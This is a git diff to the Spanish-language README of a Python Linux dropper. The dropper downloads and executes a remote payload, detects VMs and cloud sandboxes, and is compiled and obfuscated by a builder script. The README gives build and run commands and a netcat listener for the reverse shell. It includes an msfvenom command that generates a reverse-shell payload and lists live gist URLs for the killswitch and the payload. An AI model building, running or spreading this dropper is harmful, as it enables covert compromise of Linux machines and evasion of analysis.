@@ -17,8 +17,7 @@ Dropper para Linux escrito en Python 3. Descarga y ejecuta un payload de forma d
 ├── vm_detect.py # Detección de VM / cloud / QEMU
 ├── payload.py # Descarga, extracción y ejecución del payload
 ├── builder # Script de compilación y ofuscación
-└── dist/
-    └── dropper_bin # Binario generado (ejemplo)
+└── dropper # Binario generado (ejemplo)
 ```
 
 ## Uso
@@ -30,12 +29,12 @@ chmod +x builder
 ./builder "<killswitch_url>" "<payload_url>"
 ```
 
-El binario se genera en `dist/dropper_bin`.
+El binario se genera en la carpeta actual como `dropper`.
 
 ### Ejecutar
 
 ```bash
-./dist/dropper_bin
+./dropper
 ```
 
 ## Builder
@@ -126,7 +125,7 @@ Para probar la reverse shell dentro del mismo contenedor:
 nc -lvnp 4444
 
 # Terminal 2 — ejecutar dropper
-./dist/dropper_bin
+./dropper
 ```
 
 Generar un payload de prueba:
@@ -139,7 +138,7 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw | base
 
 | Recurso | URL |
 |---|---|
-| Killswitch | `https://gist.githubusercontent.com/dmartinm3/5fce63f6587f3bcfc78045b38d593978/raw/2fe9be28b9ff8746876edad27216ab1d3c2e0b7e/killswitch.txt` |
+| Killswitch | `https://gist.githubusercontent.com/dmartinm3/5fce63f6587f3bcfc78045b38d593978/raw/38c39d333319f3cfb70c1a1c0c8491758d86f96b/killswitch.txt` |
 | Payload | `https://gist.githubusercontent.com/dmartinm3/5789b0b832504fb9f1bd1f9f782ab5cc/raw/a41088bffc1509b3945e8396ed5e7096ece58227/payload.html` |
 
 ## Notas
